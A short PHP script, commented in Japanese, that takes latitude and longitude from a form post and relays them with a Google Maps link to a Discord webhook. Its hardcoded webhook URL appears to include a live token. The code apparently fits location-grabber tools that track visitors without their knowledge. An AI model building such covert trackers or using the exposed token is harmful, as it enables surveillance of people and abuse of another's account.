<?php
// DiscordのWebhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1353588317958045767/5SBnmlUCUel-cOVVpMoXlY6kPw7Ke_Re3bA1z3muce5VkD8b0LkXBRHcJCdzpPPKIxY0'; // ここに実際のWebhook URLを入力

$lat = $_POST["lat"];
$lng = $_POST["lng"];

// 緯度経度データをDiscordに送信
$location_message = "Location: Latitude = $lat, Longitude = $lng";

// Google MapsのURLを生成
$mapsUrl = "https://www.google.com/maps?q=" . $lat . "," . $lng;
$mapsurl_message = "Google Maps URL: " . $mapsUrl;

// Discordにメッセージを送信
sendMessageToDiscord($webhookUrl, $location_message);
sendMessageToDiscord($webhookUrl, $mapsurl_message);

// DiscordのWebhookを使ってメッセージを送信する関数
function sendMessageToDiscord($webhookUrl, $message) {
    $data = ['content' => $message];

    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_exec($ch);
    curl_close($ch);
}
?>
